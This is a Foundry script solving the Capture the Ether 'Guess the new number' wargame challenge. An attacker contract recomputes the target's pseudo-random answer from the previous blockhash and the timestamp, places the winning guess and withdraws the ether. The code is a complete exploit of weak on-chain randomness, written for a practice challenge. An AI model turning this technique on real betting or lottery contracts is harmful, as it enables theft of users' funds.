// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface CaptureTheEther {
    function completeChallenge(uint256 index) external;
}

interface GuessTheNewNumber {
    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberContract {
    address owner;

    constructor(address target) payable {
        owner = msg.sender;

        uint8 n;
        while (
            n !=
            uint8(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            blockhash(block.number - 1),
                            block.timestamp
                        )
                    )
                )
            )
        ) {
            n++;
        }

        console.log("n: ", n);

        GuessTheNewNumber(target).guess{value: 1 ether}(n);
    }

    function withdraw() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}

contract GuessTheNewNumberScript is Script {
    address public constant GAME = 0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee;
    address public constant CONTRACT =
        0x0562d17C4Fd3a666123DB92FF48B1c0BEF47C691;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        vm.broadcast(deployerPrivateKey);
        GuessTheNewNumberContract myContract = new GuessTheNewNumberContract{
            value: 1 ether
        }(CONTRACT);

        vm.broadcast(deployerPrivateKey);
        CaptureTheEther(GAME).completeChallenge(6);

        vm.broadcast(deployerPrivateKey);
        myContract.withdraw();
    }
}
